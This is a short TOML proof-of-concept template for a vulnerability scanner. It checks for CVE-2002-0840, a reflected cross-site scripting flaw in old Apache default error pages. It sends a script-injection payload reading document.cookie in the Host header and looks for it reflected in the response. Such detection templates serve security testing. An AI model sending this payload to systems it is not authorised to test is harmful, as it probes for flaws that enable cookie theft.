[info]
id = "POC-AVE-2002-0028"
name = "Apache HTTP Server Host Header XSS"
author = "AVE"
severity = "medium"
tags = ["xss", "apache", "host-header"]
description = "Apache HTTP Server 2.0.43/1.3.27 之前版本默认错误页面存在 Host 头部反射型 XSS 漏洞"
vuln_id = ["CVE-2002-0840", "AVE-2002-0028"]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/nonexistent"
headers.Host = "\"><script>alert(document.cookie)</script>"

[[poc.requests.matchers]]
type = "status"
status = [200, 404, 403, 500]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["<script>alert(document.cookie)</script>"]
expect = true
